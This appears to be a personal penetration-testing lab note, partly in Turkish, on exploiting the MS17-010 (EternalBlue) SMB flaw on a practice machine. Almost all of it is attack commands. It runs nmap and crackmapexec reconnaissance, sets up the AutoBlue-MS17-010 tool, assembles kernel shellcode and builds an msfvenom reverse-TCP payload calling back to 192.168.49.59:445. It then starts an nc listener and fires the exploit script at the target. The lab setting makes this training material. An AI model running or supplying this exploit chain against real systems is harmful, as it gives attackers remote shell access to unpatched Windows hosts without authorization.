**Service and Vulnerability Detection**
```bash
nmap -p445 -sV 10.10.2.130
nmap -p445 -sV --script 'smb-vuln-**' 10.10.2.130
```

![](Pasted%20image%2020220125051031.png)

**Operating System Detection**
```bash
$ crackmapexec smb 10.10.2.130 -u foo -p bar
```

![](Pasted%20image%2020220125051158.png)

**Installation AutoBlue-MS17-010**
```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
virtualenv --python=python2.7 venv
source venv/bin/activate
pip install -r requirements.txt
```

32 bit ve 64 bit için ayrı ayrı shellcode üretmek gerekiyor. Ama öncelikle kernel binary dosyalarını oluşturmalıyız. ( shell_prep.sh )

```bash
$ nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
$ nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
```

**PG-Practice Machine: Internal**
```bash
# Windows Server (R) 2008 Standard 6001 Service Pack 1 (32 bit)
$ nmap -p139,445 --script 'smb-vuln-*' $IP
$ msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.49.59 LPORT=445

$ cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
$ nc -lnvp 445
$ python3 eternalblue_exploit7.py $IP shellcode/sc_x86.bin
```

![](Pasted%20image%2020220125052639.png)